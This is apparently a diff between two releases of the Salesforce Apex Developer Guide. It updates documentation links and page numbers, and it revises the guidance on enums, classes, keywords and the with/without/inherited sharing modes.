-**–** [Decimal](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_decimal.htm)
-
-**–** [Double](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_double.htm)
-
 #### – Enum
 
-**–** [Id](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_id.htm)
+**–** [Id](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_id.htm)
 
-**–** [Integer](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_integer.htm)
+**–** [Integer](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_integer.htm)
 
-**–** [Long](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_long.htm)
+**–** [Long](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_long.htm)
 
-**–** [String](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_string.htm)
+**–** [String](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_string.htm)
 
-**–** [Time](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_time.htm)
+**–** [Time](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_time.htm)
 
 ##### Parameterized Typing
 
@@ -2252,9 +2344,6 @@ Although each value corresponds to a distinct integer value, the enum hides this
 any possible misuse of the values to perform arithmetic and so on. After you create an enum, variables, method arguments, and return
 types can be declared of that type.
 
-
-Apex Developer Guide Data Types and Variables
-
 Note: Unlike Java, the enum type itself has no constructor syntax.
 
 To define an enum, use the `enum` keyword in your declaration and use curly braces to demarcate the list of possible values. For example,
@@ -2264,6 +2353,9 @@ the following code creates an enum called `Season` :
    public enum Season {WINTER, SPRING, SUMMER, FALL}
 
 ```
+
+
+Apex Developer Guide Data Types and Variables
 
 By creating the enum `Season`, you have also created a new data type called `Season` . You can use this new data type as you would
 any other data type. For example:
@@ -2313,39 +2405,39 @@ for your organization, see _Downloading Salesforce WSDLs and Client Authenticati
 **•** `System.XmlTag` :
 
 This enum returns a list of XML tags used for parsing the result XML from a `webservice` method. For more information, see
-[XmlStreamReader Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_classes_xml_XmlStream_reader.htm)
+[XmlStreamReader Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_xml_XmlStream_reader.htm)
 
 **•** `System.ApplicationReadWriteMode` : This enum indicates if an organization is in 5 Minute Upgrade read-only mode
-[during Salesforce upgrades and downtimes. For more information, see System.getApplicationReadWriteMode().](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_system.htm#apex_System_System_getApplicationReadWriteMode)
+[during Salesforce upgrades and downtimes. For more information, see System.getApplicationReadWriteMode().](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm#apex_System_System_getApplicationReadWriteMode)
 
 **•** `System.LoggingLevel` :
 
-This enum is used with the `system.debug` method, to specify the log level for all `debug` [calls. For more information, see System](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_system.htm)
-[Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_system.htm)
+This enum is used with the `system.debug` method, to specify the log level for all `debug` [calls. For more information, see System](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm)
+[Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm)
 
 **•** `System.RoundingMode` :
 
 This enum is used by methods that perform mathematical operations to specify the rounding behavior for the operation. Typical
-examples are the Decimal `divide` method and the Double `round` [method. For more information, see Rounding Mode.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_decimal.htm)
+examples are the Decimal `divide` method and the Double `round` [method. For more information, see Rounding Mode.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_decimal.htm)
 
 **•** `System.SoapType` :
 
-This enum is returned by the field describe result `getSoapType` [method. For more information, see SOAPType Enum.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_enum_Schema_SOAPType.htm)
+This enum is returned by the field describe result `getSoapType` [method. For more information, see SOAPType Enum.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_enum_Schema_SOAPType.htm)
+
+**•** `System.DisplayType` :
+
+This enum is returned by the field describe result `getType` [method. For more information, see DisplayType Enum.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_enum_Schema_DisplayType.htm)
+
+**•** `System.JSONToken` :
+
+[This enum is used for parsing JSON content. For more information, see JsonToken Enum.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_enum_System_JsonToken.htm)
 
 
 Apex Developer Guide Data Types and Variables
 
-**•** `System.DisplayType` :
-
-This enum is returned by the field describe result `getType` [method. For more information, see DisplayType Enum.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_enum_Schema_DisplayType.htm)
-
-**•** `System.JSONToken` :
-
-[This enum is used for parsing JSON content. For more information, see JsonToken Enum.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_enum_System_JsonToken.htm)
-
 **•** `ApexPages.Severity` :
 
-[This enum specifies the severity of a Visualforce message. For more information, see ApexPages.Severity Enum.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_pages_message.htm)
+[This enum specifies the severity of a Visualforce message. For more information, see ApexPages.Severity Enum.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_pages_message.htm)
 
 **•** `Dom.XmlNodeType` :
 
@@ -2353,7 +2445,7 @@ This enum specifies the node type in a DOM document.
 
 Note: System-defined enums cannot be used in Web service methods.
 
-[All enum values, including system enums, have common methods associated with them. For more information, see Enum Methods.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_enum.htm)
+[All enum values, including system enums, have common methods associated with them. For more information, see Enum Methods.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_enum.htm)
 
 You cannot add user-defined methods to enum values.
 
@@ -2398,15 +2490,12 @@ dollar signs ($) and hyphens (-), aren’t allowed.
 
 **•** Varable names can’t contain consecutive underscores (_ _).
 
-**•** [Reserved keywords can’t be used as variable names.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_reserved_words.htm)
+**•** [Reserved keywords can’t be used as variable names.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_reserved_words.htm)
 
 **•** Variable names can have a maximum length of 255 characters.
 
 **•** Salesforce doesn't recommend sharing the same name between a variable and either its class or a method in its class, although it
 is permitted to do so.
-
-
-Apex Developer Guide Data Types and Variables
 
 Null Variables and Initial Values
 
@@ -2419,6 +2508,9 @@ also assign `null` to any variable declared with a primitive type. For example, 
    Decimal d;
 
 ```
+
+
+Apex Developer Guide Data Types and Variables
 
 Many instance methods on the data type will fail if the variable is `null` . In this example, the second statement generates an exception
 ( `NullPointerException` )
@@ -2494,12 +2586,13 @@ To avoid confusion with case-insensitive SOQL and SOSL queries, Apex is also cas
 
 Note: You’ll learn more about sObjects, SOQL, and SOSL later in this guide.
 
-
-Apex Developer Guide Data Types and Variables
-
 Also note that Apex uses the same filtering semantics as SOQL, which is the basis for comparisons in the SOAP API and the Salesforce
 user interface. The use of these semantics can lead to some interesting behavior. For example, if an end-user generates a report based
 on a filter for values that come before 'm' in the alphabet (that is, values < 'm'), null fields are returned in the result. The rationale for this
+
+
+Apex Developer Guide Data Types and Variables
+
 behavior is that users typically think of a field without a value as just a space character, rather than its actual `null` value. Consequently,
 in Apex, the following expressions all evaluate to `true` :
 
@@ -2552,7 +2645,7 @@ second is assigned a value in a static block by calling a static method.
 
 ```
 
-For more information, see Using the `final` Keyword on page 85.
+For more information, see Using the `final` Keyword on page 86.
 
 #### Expressions and Operators
 
@@ -2652,7 +2745,7 @@ of expression yields a query result, much like SOQL and SOSL queries.
 
 ```
 
-For information, see SOQL and SOSL Queries on page 169.
+For information, see SOQL and SOSL Queries on page 170.
 
 
 Apex Developer Guide Data Types and Variables
@@ -3538,7 +3631,7 @@ Similarly, two lists can point at the same value in memory. For example:
 
 ```
 
-In addition to `=`, other valid assignment operators include `+=`, `*=`, `/=`, `|=`, `&=`, `++`, and `--` . See Expression Operators on page 39.
+In addition to `=`, other valid assignment operators include `+=`, `*=`, `/=`, `|=`, `&=`, `++`, and `--` . See Expression Operators on page 40.
 
 #### Rules of Conversion
 
@@ -4440,7 +4533,7 @@ To define a class, specify the following:
 **4.** Optional extensions or implementations or both
 
 Note: Avoid using standard object names for class names. Doing so causes unexpected results. For a list of standard objects, see
-[Object Reference for Salesforce.](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/)
+[Object Reference for Salesforce.](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/)
 
 Use the following syntax for defining classes:
 
@@ -4473,7 +4566,7 @@ with the `webservice` keyword must be declared as `global` . If a method or inne
 top-level class must also be defined as `global` .
 
 **•** The `with sharing` and `without sharing` keywords specify the sharing mode for this class. For more information, see
-Use the with sharing, without sharing, and inherited sharing Keywords on page 89.
+Use the with sharing, without sharing, and inherited sharing Keywords on page 90.
 
 **•** The `virtual` definition modifier declares that this class allows extension and overrides. You can’t override a method with the
 
@@ -4491,12 +4584,12 @@ an implementation.
 
 **•** You can’t override a public or protected virtual method of a global class of an installed managed package.
 
-For more information about managed packages, see Managed Package Types on page 751.
+For more information about managed packages, see Managed Package Types on page 766.
 
 A class can implement multiple interfaces, but only extend one existing class. This restriction means that Apex doesn’t support multiple
-inheritance. The interface names in the list are separated by commas. For more information about interfaces, see Interfaces on page 81.
+inheritance. The interface names in the list are separated by commas. For more information about interfaces, see Interfaces on page 82.
 
-For more information about method and variable access modifiers, see Access Modifiers on page 68.
+For more information about method and variable access modifiers, see Access Modifiers on page 69.
 
 Versioned Behavior Changes
 
@@ -4556,7 +4649,7 @@ Versioned Behavior Changes
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation. For more
-[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 ##### Class Methods
 
@@ -4615,7 +4708,7 @@ User-defined methods:
 
 Apex Developer Guide Classes, Objects, and Interfaces
 
-**•** Can have side effects, such as DML `insert` [statements that initialize sObject record IDs. See Apex DML Statements.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_dml_section.htm#apex_dml)
+**•** Can have side effects, such as DML `insert` [statements that initialize sObject record IDs. See Apex DML Statements.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_dml_section.htm#apex_dml)
 
 **•** Can refer to themselves or to methods defined later in the same class or anonymous block. Apex parses methods in two phases, so
 forward declarations aren’t needed.
@@ -4623,7 +4716,7 @@ forward declarations aren’t needed.
 **•** Can be overloaded. For example, a method named `example` can be implemented in two ways, one with a single Integer parameter
 and one with two Integer parameters. Depending on whether the method is called with one or two Integers, the Apex parser selects
 the appropriate implementation to execute. If the parser can’t find an exact match, it then seeks an approximate match using type
-coercion rules. For more information on data conversion, see Rules of Conversion on page 51.
+coercion rules. For more information on data conversion, see Rules of Conversion on page 52.
 
 Note: If the parser finds multiple approximate matches, a parse-time exception is generated.
 
@@ -4772,7 +4865,7 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation. For more
-[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 SEE ALSO:
 
@@ -4902,7 +4995,7 @@ Apex allows you to use the `private`, `protected`, `public`, and `global` access
 While triggers and anonymous blocks can also use these access modifiers, they aren’t as useful in smaller portions of Apex. For example,
 declaring a method as `global` in an anonymous block doesn’t enable you to call it from outside of that code.
 
-For more information on class access modifiers, see Apex Class Definition on page 62.
+For more information on class access modifiers, see Apex Class Definition on page 63.
 
 Note: Methods defined in an interface have the same access modifier as the interface ( `public` or `global` ). For more information,
 see Interfaces.
@@ -4941,7 +5034,7 @@ Note: In Apex, the `public` access modifier isn’t the same as it is in Java. T
 to keep the code for each application separate. In Apex, if you want to make something public like it is in Java, you must use
 the `global` access modifier.
 
-[For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 ```
    global
@@ -5281,7 +5374,7 @@ Versioned Behavior Changes
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation. For more
-[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 ##### Apex Properties
 
@@ -5330,7 +5423,7 @@ Where:
 **•** _`access_modifier`_ is the access modifier for the property. The access modifiers that can be applied to properties include:
 
 `public`, `private`, `global`, and `protected` . In addition, these definition modifiers can be applied: `static` and
-`transient` . For more information on access modifiers, see Access Modifiers on page 68.
+`transient` . For more information on access modifiers, see Access Modifiers on page 69.
 
 **•** _`return_type`_ is the type of the property, such as Integer, Double, sObject, and so on. For more information, see Data Types on
 page 24.
@@ -5392,7 +5485,7 @@ property.
 
 **–** Properties provide storage for values directly. You don’t need to create supporting members for storing values.
 
-**–** It’s possible to create automatic properties in Apex. For more information, see Using Automatic Properties on page 74.
+**–** It’s possible to create automatic properties in Apex. For more information, see Using Automatic Properties on page 75.
 
 Using Automatic Properties
 
@@ -5653,7 +5746,7 @@ an abstract or override method without an allowed access modifier, you get the c
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation. For more
-[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 ##### Extended Class Example
 
@@ -6073,7 +6166,7 @@ When you define a new interface, you’re defining a new data type. You can use 
 type name. Any object assigned to a variable of type interface must be an instance of a class that implements the interface, or a
 sub-interface data type.
 
-See also Classes and Casting on page 117.
+See also Classes and Casting on page 118.
 
 Note: You can’t add a method to a global interface after the class has been uploaded in a Managed - Released package version.
 
@@ -6081,7 +6174,7 @@ Versioned Behavior Changes
 
 In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
 annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation. For more
-[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.260.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
+[information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.](https://developer.salesforce.com/docs/atlas.en-us.262.0.sfdx_dev.meta/sfdx_dev/sfdx_dev_unlocked_namespace_visibility.htm)
 
 In API version 61.0 and later, private methods are no longer overridden by an instance method with the same signature in a subclass.
 This change is versioned, so to prevent the override, update your abstract or virtual classes that contain private methods to API version
@@ -6264,28 +6357,29 @@ The following is a batch job that uses an iterator:
 
 Apex provides the keywords `final`, `instanceof`, `super`, `this`, `transient`, `with sharing` and `without sharing` .
 
-1. Using the final Keyword Keyword
+1. Using the final Keyword
 
-2. Using the instanceof Keyword Keyword
+2. Using the instanceof Keyword
 
-3. Using the super Keyword Keyword
+3. Using the super Keyword
 
-4. Using the this Keyword Keyword
+4. Using the this Keyword
 
-5. Using the transient Keyword Keyword
+5. Using the transient Keyword
 
 
 Apex Developer Guide Classes, Objects, and Interfaces
 
 6. Use the with sharing, without sharing, and inherited sharing Keywords
-Use the `with sharing` or `without sharing` keywords on a class to specify whether sharing rules must be enforced. Use
-the `inherited sharing` keyword on a class to run the class in the sharing mode of the class that called it.
+Use the `with sharing` or `without sharing` keywords on a class to specify whether sharing rules are enforced. Use the
+`inherited sharing` keyword on a class to run the class in the sharing mode of the calling class. The default sharing mode
+is `with sharing` .
 
 SEE ALSO:
 
 Reserved Keywords
 
-##### Using the final Keyword Keyword
+##### Using the final Keyword
 
 Keep in mind these consideration while using the `final` keyword to modify variables.
 
@@ -6306,7 +6400,7 @@ SEE ALSO:
 
 Extended Class Example
 
-##### Using the instanceof Keyword Keyword
+##### Using the instanceof Keyword
 
 If you need to verify at run time whether an object is actually an instance of a particular class, use the `instanceof` keyword. The
 
@@ -6393,7 +6487,7 @@ In API version 32.0 and later, `instanceof` returns `false` if the left operand 
 
    System.assertEquals(false, result);
 
-##### Using the super Keyword Keyword
+##### Using the super Keyword
 
 ```
 
@@ -6501,7 +6595,7 @@ Best Practices for Using the **`super`** Keyword
 
 **•** You can only use `super` in methods that are designated with the `override` keyword.
 
-##### Using the this Keyword Keyword
+##### Using the this Keyword
 
 There are two different ways of using the `this` keyword.
 
@@ -6558,7 +6652,7 @@ the `this` keyword with parentheses. For example:
 
 When you use the `this` keyword in a constructor to do constructor chaining, it must be the first statement in the constructor.
 
-##### Using the transient Keyword Keyword
+##### Using the transient Keyword
 
 Use the `transient` keyword to declare instance variables that can't be saved, and shouldn't be transmitted as part of the view state
 for a Visualforce page. For example:
@@ -6590,7 +6684,7 @@ a collection of Savepoints
 
 **•** `JSONParser` class instances.
 
-[Static variables also don't get transmitted through the view state.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_static.htm)
+[Static variables also don't get transmitted through the view state.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_classes_static.htm)
 
 The following example contains both a Visualforce page and a custom controller. Clicking the **refresh** button on the page causes the
 transient date to be updated because it is being recreated each time the page is refreshed. The non-transient date continues to have
@@ -6645,30 +6739,28 @@ Apex Developer Guide Classes, Objects, and Interfaces
 
 SEE ALSO:
 
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_JsonParser.htm)_ : JSONParser Class
+_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_JsonParser.htm)_ : JSONParser Class
 
-##### Use the with sharing, without sharing, and inherited sharing Keywords Use the with sharing or without sharing keywords on a class to specify whether sharing rules must be enforced. Use the
+##### Use the with sharing, without sharing, and inherited sharing Keywords Use the with sharing or without sharing keywords on a class to specify whether sharing rules are enforced. Use the
 
-`inherited sharing` keyword on a class to run the class in the sharing mode of the class that called it.
+`inherited sharing` keyword on a class to run the class in the sharing mode of the calling class. The default sharing mode is
+`with sharing` .
 
-[Tip: For information about how sharing rules are defined, see Sharing Rules in Salesforce Help.](https://help.salesforce.com/s/articleView?id=platform.security_about_sharing_rules.htm&type=5&language=en_US)
+[Tip: For information about how to create sharing rules, see Sharing Rules in Salesforce Help.](https://help.salesforce.com/s/articleView?id=platform.security_about_sharing_rules.htm&type=5&language=en_US)
 
 With Sharing
 
-##### Use the with sharing keyword when declaring a class to enforce sharing rules of the current user. Explicitly setting this keyword
+##### Use the with sharing keyword when declaring a class to enforce sharing rules of the current user. Salesforce recommends that
 
-ensures that Apex code runs in the current user context. Apex code that is executed with the `executeAnonymous` call and Connect
-in Apex always execute using the sharing rules of the current user. For more information on `executeAnonymous`, see Anonymous
-Blocks on page 264.
-
-##### Use the with sharing keywords when declaring a class to enforce the sharing rules that apply to the current user. For example:
+you explicitly set this keyword to ensure that Apex code runs in the current user context. If a class doesn’t have an explicit sharing
+declaration, then it defaults to `with sharing` .
 
 ```
    public with sharing class sharingClass {
 
-     // Code here
+        // Code here
 
-   }
+        }
 
 ```
 
@@ -6676,11 +6768,13 @@ Without Sharing
 
 ##### Use the without sharing keyword when declaring a class to ensure that the sharing rules for the current user aren’t enforced.
 
-For example, to turn off sharing rule enforcement for a class that’s called by a class that has sharing rules enforced, use the `without`
-`sharing` keyword on the called class.
+For example, you can explicitly allow a class to ignore sharing rules even when it’s called from another class that does enforce sharing
+rules.
 
 ```
    public without sharing class noSharing {
+
+        // Code here
 
 ```
 
@@ -6688,24 +6782,26 @@ For example, to turn off sharing rule enforcement for a class that’s called by
 Apex Developer Guide Classes, Objects, and Interfaces
 
 ```
-     // Code here
-
-   }
+        }
 
 ```
 
+Important: If you declare a class as `without sharing`, the class can access records that the current user otherwise doesn’t
+have permission to access. Salesforce recommends that you use `without sharing` only for classes that require system-level
+access.
+
 Inherited Sharing
 
-Use the `inherited sharing` keyword when declaring a class to enforce the sharing rules of the class that calls it. Using
-`inherited sharing` is an advanced technique to determine the sharing mode at runtime and design Apex classes that can run
-in either `with sharing` or `without sharing` mode.
+Use the `inherited sharing` keyword when declaring a class to enforce the sharing rules of the calling class. Using `inherited`
+`sharing` is an advanced technique to determine the sharing mode at run time and design Apex classes that can run in either `with`
+`sharing` or `without sharing` mode.
 
-Warning: Because the sharing mode is determined at runtime, you must take extreme care to ensure that your Apex code is
+Important: Because the sharing mode is determined at run time, you must take extreme care to ensure that your Apex code is
 secure to run in both `with sharing` and `without sharing` modes.
 
-Using `inherited sharing`, along with other appropriate security checks, facilitates in passing AppExchange security review and
+Using `inherited sharing`, along with other appropriate security checks, helps your code pass AppExchange security review and
 ensures that your privileged Apex code isn’t used in unexpected or insecure ways. An Apex class with `inherited sharing` runs
-as `with sharing` if used as:
+in `with sharing` mode if used as:
 
 **•** An Aura component controller
 
@@ -6719,183 +6815,92 @@ as `with sharing` if used as:
 
 **•** Any other entry point to an Apex transaction
 
-Using the `inherited sharing` keyword ensures that the default is to run as `with sharing` . A class declared as `inherited`
-`sharing` runs as `without sharing` only if explicitly called from an already established `without sharing` context.
+A class declared as `inherited sharing` runs as `without sharing` only when explicitly called from an already established
+`without sharing` context.
 
-Example: This example declares an Apex class with `inherited sharing` and a Visualforce invocation of that Apex code.
-Because of the `inherited sharing` declaration, only contacts for which the running user has sharing access are displayed.
-If the declaration is omitted, contacts that the user has no rights to view are displayed due to the insecure default behavior.
+Omitted Sharing
 
-```
-      public inherited sharing class InheritedSharingClass {
+Apex without an explicit sharing declaration runs as `with sharing` by default. However, if an Apex class without an explicit sharing
+declaration extends from a parent class, it adopts the same sharing mode as the parent class.
 
-        public List<Contact> getAllTheSecrets() {
+Important: We recommend that you always include an explicit sharing declaration on Apex classes that include database
+operations or SOQL queries. This practice promotes intentionality and increases code maintainability.
 
-           return [SELECT Name FROM Contact];
-
-        }
-
-      }
-
-      <apex:page controller="InheritedSharingClass">
-
-        <apex:repeat value="{!allTheSecrets}" var="record">
-
-           {!record.Name}
-
-        </apex:repeat>
-
-      </apex:page>
-
-```
-
-Omitted Sharing Declarations
-
-Important: Apex without an explicit sharing declaration is insecure by default. We strongly recommend that you always specify
-a sharing declaration for a class.
-
-If a class isn’t explicitly declared as either `with sharing` or `without sharing`, the current sharing rules remain in effect.
-Therefore, the class doesn’t enforce sharing rules except if it acquires sharing rules from another class. For example, if the class is called
-by another class that has sharing enforced, then sharing is enforced for the called class.
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-There’s a distinct difference between an Apex class that’s explicitly marked with `inherited sharing` and one with an omitted
-sharing declaration. For these entry points to an Apex transaction, an omitted sharing declaration defaults to these sharing modes:
-
-**•** An Aura component controller: `with sharing`
-
-**•** An `@AuraEnabled` method called from a Lightning web component: `with sharing`
-
-**•** A Visualforce controller: `without sharing`
-
-**•** An Apex REST service: `without sharing`
-
-**•** An asynchronous Apex class: `without sharing`
-
-**•** Any other entry point to an Apex transaction: `without sharing`
+Identifying the sharing mode for Apex classes compiled with API version 66.0 or earlier is challenging without an explicit declaration.
+Determining the sharing mode in these cases requires a thorough investigation of the class inheritance tree, the caller sequence,
+and the class’s behavior. See the Versioned Behavior Changes section.
 
 Implementation in Apex Triggers
 
-Apex triggers can’t have an explicit sharing declaration. Triggers typically run as `without sharing`, meaning that sharing rules for
-the current user aren’t enforced. However, a nested trigger that fires due to the execution of another trigger runs as `with sharing`
-in the following circumstances:
+Apex triggers can’t have an explicit sharing declaration. Triggers always run in system mode and as `without sharing`, which
+means that they bypass the sharing rules, field-level security, and object permissions of the current user. Instead, to enforce data access
+settings, delegate business logic to separate trigger handlers, where you can define sharing and access modes.
 
-**•** A DML operation that runs in user mode on page 216 invokes the nested trigger. For example, given this sample code, if an account
-is inserted into the database, then `ContactTrigger1` runs as `with sharing` .
+Other Implementation Details
 
-```
-     // Trigger fires in without sharing mode
-
-     trigger AccountTrigger1 on Account (before insert) {
-
-       // DML operation runs in user mode (sharing rules are applied)
-
-       insert as user new Contact(FirstName='Test', LastName='Test2');
-
-     }
-
-     trigger ContactTrigger1 on Contact (before insert) {
-
-       // Statements in this nested trigger run in with sharing mode
-
-       // Calls to other classes use the declared sharing mode of each class
-
-     }
-
-```
-
-**•** A DML operation in a method of a class that enforces sharing rules invokes the nested trigger. The class can enforce sharing rules
-explicitly with the `with sharing` declaration or inherit the sharing declaration. For example, given this sample code, if an
-account is inserted into the database, then `ContactTrigger2` runs as `with sharing` .
-
-```
-     // Trigger fires in without sharing mode
-
-     trigger AccountTrigger2 on Account (before insert) {
-
-       // Call to ContactInsert uses sharing mode of that class (with sharing)
-
-       ContactInsert.run();
-
-     }
-
-     public with sharing class ContactInsert {
-
-       public static void run() {
-
-          insert as user new Contact(FirstName='Test', LastName='Test2');
-
-       }
-
-     }
-
-     trigger ContactTrigger2 on Contact (before insert) {
-
-       // Statements in this nested trigger run in with sharing mode
-
-       // Calls to other classes use the declared sharing mode of each class
-
-     }
-
-```
-
-In both cases, after the nested trigger fires in `with sharing` mode, subsequent calls to other classes use the declared sharing mode
-of each class.
+**•** Sharing declarations don’t enforce object-level access or field-level security. See Enforcing Object and Field Permissions.
 
 
 Apex Developer Guide Classes, Objects, and Interfaces
 
-Other Implementation Details
+**•** Except for methods in an `inherited sharing` class, the sharing mode of a method is determined by where the method is
+defined, not where it’s called from. For example, a method defined in a `with sharing` class still enforces sharing rules even if
+it’s called from a `without sharing` class. Exceptions also apply to methods for classes compiled with API version 66.0 or earlier.
+See the Versioned Behavior Changes section.
 
-**•** The sharing setting of the class where a method is defined is applied, not of the class where the method is called from. For example,
-if a method is defined in a class declared as `with sharing` is called by a class declared as `without sharing`, the method
-executes with sharing rules enforced.
+**•** You can declare a sharing mode on both inner classes and outer classes. Inner classes don’t adopt the sharing mode of the container
+class. Otherwise, the sharing setting applies to all code contained in the class, including initialization code, constructors, and methods.
 
-**•** Both inner classes and outer classes can be declared as `with sharing` . Inner classes do not inherit the sharing setting from their
-container class. Otherwise, the sharing setting applies to all code contained in the class, including initialization code, constructors,
-and methods.
-
-**•** Classes inherit the sharing setting from a parent class when one class extends another.
+**•** If an Apex class without an explicit sharing declaration extends from a parent class, then it adopts the same sharing mode as the
+parent class.
 
 **•** Asynchronous Apex classes defined with `inherited sharing` always run in `with sharing` mode for asynchronous
-operations. Each asynchronous operation is a new entry point and the sharing mode is not serialized.
+operations. Each asynchronous operation is a new entry point and the sharing mode isn’t serialized.
+
+**•** Anonymous Apex and Connect in Apex always run in `with sharing` mode.
 
 Best Practices
 
-Apex without an explicit sharing declaration is insecure by default. We strongly recommend that you always specify a sharing declaration
-for a class.
